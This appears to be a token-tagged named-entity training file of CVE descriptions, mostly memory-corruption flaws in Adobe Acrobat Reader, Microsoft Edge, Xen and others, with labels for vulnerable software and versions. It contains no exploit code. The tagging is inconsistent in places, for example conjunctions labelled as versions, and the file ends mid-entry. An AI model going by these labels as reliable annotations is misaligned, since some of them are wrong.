. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
parsing O O
an O O
invalid O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
record O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
pixel O O
block O O
transfer O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
parsing O O
JPEG O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
private O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
transformation O O
of O O
blocks O O
of O O
pixels O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
line O O
segments O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
text O O
strings O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
curve O O
drawing O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
font O O
parsing O O
module O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
internal O O
handling O O
of O O
UTF-16 O O
literal O O
strings O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
block O O
transfer O O
of O O
pixels O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
JPEG O O
2000 O O
engine O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
when O O
processing O O
JPEG O O
2000 O O
( O O
JP2 O O
) O O
code O O
stream O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
processing O O
engine O O
when O O
processing O O
JPEG O O
2000 O O
( O O
JP2 O O
) O O
code O O
stream O O
data O O
. O O

An O O
issue O O
was O O
discovered O O
in O O
Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
27.0.0.183 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions S-vulnerable_version pair_0
. O O

This O O
vulnerability O O
is O O
an O O
instance O O
of O O
a O O
use O O
after O O
free O O
vulnerability O O
in O O
the O O
Primetime O O
SDK O O
metadata O O
functionality O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
drawing O O
of O O
Unicode O O
text O O
strings O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
bitmap O O
transformations O O
. O O

This O O
vulnerability O O
is O O
an O O
instance O O
of O O
a O O
use O O
after O O
free O O
vulnerability O O
in O O
the O O
Primetime O O
SDK O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
rendering O O
a O O
path O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
text O O
output O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
font O O
parsing O O
, O O
where O O
the O O
font O O
is O O
embedded O O
in O O
the O O
XML O O
Paper O O
Specification O O
( O O
XPS O O
) O O
file O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
that O O
occurs O O
when O O
reading O O
a O O
JPEG O O
file O O
embedded O O
within O O
XML O O
Paper O O
Specification O O
( O O
XPS O O
) O O
file O O
. O O

In O O
android O O
for O O
MSM O O
, O O
Firefox O O
OS O O
for O O
MSM O O
, O O
QRD O O
Android O O
, O O
with O O
all O O
Android O O
releases O O
from O O
CAF O O
using O O
the O O
Linux O O
kernel O O
, O O
due O O
to O O
a O O
race O O
condition O O
in O O
the O O
function O O
audio_effects_shared_ioctl O O
( O O
) O O
, O O
memory O O
corruption O O
can O O
occur O O
. O O

In O O
all O O
Qualcomm O O
products O O
with O O
Android O O
releases O O
from O O
CAF O O
using O O
the O O
Linux O O
kernel O O
, O O
concurrent O O
calls O O
into O O
ioctl O O
RMNET_IOCTL_ADD_MUX_CHANNEL O O
in O O
ipa O O
wan O O
driver O O
may O O
lead O O
to O O
memory O O
corruption O O
due O O
to O O
missing O O
locks O O
. O O

The O O
grant-table O O
feature O O
in O O
Xen S-vulnerable_software pair_0
through S-vulnerable_version pair_0
4.8.x S-vulnerable_version pair_0
does O O
not O O
ensure O O
sufficient O O
type O O
counts O O
for O O
a O O
GNTMAP_device_map O O
and O O
GNTMAP_host_map O O
mapping O O
, O O
which O O
allows O O
guest O O
OS O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
count O O
mismanagement O O
and O O
memory O O
corruption O O
) O O
or O O
obtain O O
privileged O O
host O O
OS O O
access O O
, O O
aka O O
XSA-224 O O
bug O O
2 O O
. O O

grant-table O O
feature O O
in O O
Xen S-vulnerable_software pair_0
through S-vulnerable_version pair_0
4.8.x S-vulnerable_version pair_0
mishandles O O
a O O
GNTMAP_device_map O O
and O O
GNTMAP_host_map O O
mapping O O
, O O
when O O
followed O O
by O O
only O O
a O O
GNTMAP_host_map O O
unmapping O O
, O O
which O O
allows O O
guest O O
OS O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
count O O
mismanagement O O
and O O
memory O O
corruption O O
) O O
or O O
obtain O O
privileged O O
host O O
OS O O
access O O
, O O
aka O O
XSA-224 O O
bug O O
1 O O
. O O

Memory O O
corruption O O
vulnerability O O
in O O
Rakuraku S-vulnerable_software pair_0
Hagaki S-vulnerable_software pair_0
( O O
Rakuraku O O
Hagaki O O
2018 S-vulnerable_version pair_0
, O O
Rakuraku S-vulnerable_software pair_1
Hagaki S-vulnerable_software pair_1
2017 S-vulnerable_version pair_1
, O O
Rakuraku S-vulnerable_software pair_2
Hagaki S-vulnerable_software pair_2
2016 S-vulnerable_version pair_2
) O O
and O O
Rakuraku O O
Hagaki O O
Select O O
for O O
Ichitaro S-vulnerable_software pair_3
( O O
Ichitaro O O
2017 O O
, O O
Ichitaro O O
2016 S-vulnerable_version pair_3
, O O
Ichitaro S-vulnerable_software pair_4
2015 S-vulnerable_version pair_4
, O O
Ichitaro O O
Pro3 O O
, O O
Ichitaro O O
Pro2 O O
, O O
Ichitaro O O
Pro O O
, O O
Ichitaro S-vulnerable_software pair_5
2011 S-vulnerable_version pair_5
, O O
Ichitaro S-vulnerable_software pair_6
Government S-vulnerable_version pair_6
8 S-vulnerable_version pair_6
, O O
Ichitaro S-vulnerable_software pair_7
Government S-vulnerable_version pair_7
7 S-vulnerable_version pair_7
, O O
Ichitaro S-vulnerable_software pair_8
Government S-vulnerable_version pair_8
6 S-vulnerable_version pair_8
and O O
Ichitaro S-vulnerable_software pair_9
2017 S-vulnerable_version pair_9
Trial S-vulnerable_version pair_9
version S-vulnerable_version pair_9
) O O
allows O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
with O O
privileges O O
of O O
the O O
application O O
via O O
specially O O
crafted O O
file O O
. O O

A O O
vulnerability O O
in O O
the O O
OpenOffice S-vulnerable_software pair_0
Writer S-vulnerable_software pair_0
DOC S-vulnerable_software pair_0
file S-vulnerable_software pair_0
parser S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4.1.4 S-vulnerable_version pair_0
, O O
and O O
specifically O O
in O O
the O O
WW8Fonts O O
Constructor O O
, O O
allows O O
attackers O O
to O O
craft O O
malicious O O
documents O O
that O O
cause O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
potentially O O
resulting O O
in O O
arbitrary O O
code O O
execution O O
. O O

In O O
all O O
Qualcomm O O
products O O
with O O
Android S-vulnerable_software pair_0
releases O O
from S-vulnerable_version pair_0
CAF S-vulnerable_version pair_0
using O O
the O O
Linux O O
kernel O O
, O O
in O O
a O O
video O O
driver O O
, O O
memory O O
corruption O O
can O O
potentially O O
occur O O
due O O
to O O
lack O O
of O O
bounds O O
checking O O
in O O
a O O
memcpy O O
( O O
) O O
. O O

An O O
uninitialized O O
stack O O
variable O O
vulnerability O O
in O O
load_tic_series O O
( O O
) O O
in O O
set.c O O
in O O
gnuplot S-vulnerable_software pair_0
5.2.rc1 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
cause O O
Denial O O
of O O
Service O O
( O O
Segmentation O O
fault O O
and O O
Memory O O
Corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
when O O
a O O
victim O O
opens O O
a O O
specially O O
crafted O O
file O O
. O O

A O O
memory O O
corruption O O
vulnerability O O
has O O
been O O
identified O O
( O O
aka O O
improper O O
restriction O O
of O O
operations O O
within O O
the O O
bounds O O
of O O
a O O
memory O O
buffer O O
) O O
, O O
which O O
may O O
allow O O
remote O O
code O O
execution O O
. O O

An O O
issue O O
was O O
discovered O O
in O O
Fuji S-vulnerable_software pair_0
Electric S-vulnerable_software pair_0
V-Server S-vulnerable_software pair_0
Version O O
3.3.22.0 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
prior S-vulnerable_version pair_0
. O O

An O O
issue O O
was O O
discovered O O
in O O
Oniguruma S-vulnerable_software pair_0
6.2.0 S-vulnerable_version pair_0
, O O
as O O
used O O
in O O
Oniguruma-mod O O
in O O
Ruby S-vulnerable_software pair_1
through S-vulnerable_version pair_1
2.4.1 S-vulnerable_version pair_1
and O O
mbstring O O
in O O
PHP S-vulnerable_software pair_2
through S-vulnerable_version pair_2
7.1.5 S-vulnerable_version pair_2
. O O

A O O
heap O O
out-of-bounds O O
write O O
occurs O O
in O O
bitset_set_range O O
( O O
) O O
during O O
regular O O
expression O O
compilation O O
due O O
to O O
an O O
uninitialized O O
variable O O
from O O
an O O
incorrect O O
state O O
transition O O
. O O

An O O
incorrect O O
state O O
transition O O
in O O
parse_char_class O O
( O O
) O O
could O O
create O O
an O O
execution O O
path O O
that O O
leaves O O
a O O
critical O O
local O O
variable O O
uninitialized O O
until O O
it O O
used O O
as O O
an O O
index O O
, O O
resulting O O
in O O
an O O
out-of-bounds O O
write O O
memory O O
corruption O O
. O O

A O O
heap O O
out-of-bounds O O
write O O
or O O
read O O
occurs O O
in O O
next_state_val O O
( O O
) O O
during O O
regular O O
expression O O
compilation O O
. O O

Octal O O
numbers O O
larger O O
than O O
0xff O O
are O O
not O O
handled O O
correctly O O
in O O
fetch_token O O
( O O
) O O
and O O
fetch_token_in_cc O O
( O O
) O O
. O O

Quick S-vulnerable_software pair_0
Heal S-vulnerable_software pair_0
Internet S-vulnerable_software pair_0
Security S-vulnerable_software pair_0
10.1.0.316 S-vulnerable_version pair_0
, O O
Quick S-vulnerable_software pair_1
Heal S-vulnerable_software pair_1
Total S-vulnerable_software pair_1
Security S-vulnerable_software pair_1
10.1.0.316 S-vulnerable_version pair_1
, O O
and O O
Quick S-vulnerable_software pair_2
Heal S-vulnerable_software pair_2
AntiVirus S-vulnerable_software pair_2
Pro S-vulnerable_software pair_2
10.1.0.316 S-vulnerable_version pair_2
are O O
vulnerable O O
to O O
Memory O O
Corruption O O
while O O
parsing O O
a O O
malformed O O
Mach-O O O
file O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8649 O O
, O O
CVE-2017-8660 O O
, O O
CVE-2017-8729 O O
, O O
CVE-2017-8738 O O
, O O
CVE-2017-8740 O O
, O O
CVE-2017-8741 O O
, O O
CVE-2017-8748 O O
, O O
CVE-2017-8752 O O
, O O
CVE-2017-8753 O O
, O O
CVE-2017-8755 O O
, O O
and O O
CVE-2017-11764 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
Edge O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8649 O O
, O O
CVE-2017-8649 O O
, O O
CVE-2017-8660 O O
, O O
CVE-2017-8729 O O
, O O
CVE-2017-8738 O O
, O O
CVE-2017-8740 O O
, O O
CVE-2017-8741 O O
, O O
CVE-2017-8748 O O
, O O
CVE-2017-8752 O O
, O O
CVE-2017-8753 O O
, O O
CVE-2017-8756 O O
, O O
and O O
CVE-2017-11764 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
in O O
Microsoft O O
Edge O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

We O O
can O O
make O O
it O O
throw O O
an O O
exception O O
simply O O
by O O
exhausting O O
the O O
stack O O
. O O

So O O
in O O
the O O
case O O
, O O
the O O
function O O
body O O
remains O O
reseted O O
( O O
invalid O O
) O O
. O O

void O O
JavascriptFunction O O
: O O
:ReparseAsmJsModule O O
( O O
ScriptFunction O O
functionRef O O
) O O
{ O O
ParseableFunctionInfo O O
functionInfo O O
= O O
( O O
functionRef O O
) O O
- O O
> O O
GetParseableFunctionInfo O O
( O O
) O O
; O O
Assert O O
( O O
functionInfo O O
) O O
; O O
functionInfo- O O
> O O
GetFunctionBody O O
( O O
) O O
- O O
> O O
AddDeferParseAttribute O O
( O O
) O O
; O O
functionInfo- O O
> O O
GetFunctionBody O O
( O O
) O O
- O O
> O O
ResetEntryPoint O O
( O O
) O O
; O O
functionInfo- O O
> O O
GetFunctionBody O O
( O O
) O O
- O O
> O O
ResetInParams O O
( O O
) O O
; O O
FunctionBody O O
funcBody O O
= O O
functionInfo- O O
> O O
Parse O O
( O O
functionRef O O
) O O
; O O
if O O
ENABLE_PROFILE_INFO O O
This O O
is O O
the O O
first O O
call O O
to O O
the O O
function O O
, O O
ensure O O
dynamic O O
profile O O
info O O
funcBody- O O
> O O
EnsureDynamicProfileInfo O O
( O O
) O O
; O O
endif O O
( O O
functionRef O O
) O O
- O O
> O O
UpdateUndeferredBody O O
( O O
funcBody O O
) O O
; O O
} O O
First O O
, O O
it O O
resets O O
the O O
function O O
body O O
and O O
then O O
re-parses O O
it O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
the O O
way O O
that O O
the O O
Microsoft O O
Edge O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8649 O O
, O O
CVE-2017-8660 O O
, O O
CVE-2017-8729 O O
, O O
CVE-2017-8738 O O
, O O
CVE-2017-8740 O O
, O O
CVE-2017-8741 O O
, O O
CVE-2017-8748 O O
, O O
CVE-2017-8753 O O
, O O
CVE-2017-8755 O O
, O O
CVE-2017-8756 O O
, O O
and O O
CVE-2017-11764 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8731 O O
, O O
CVE-2017-8734 O O
, O O
and O O
CVE-2017-11766 O O
. O O

Microsoft O O
Edge O O
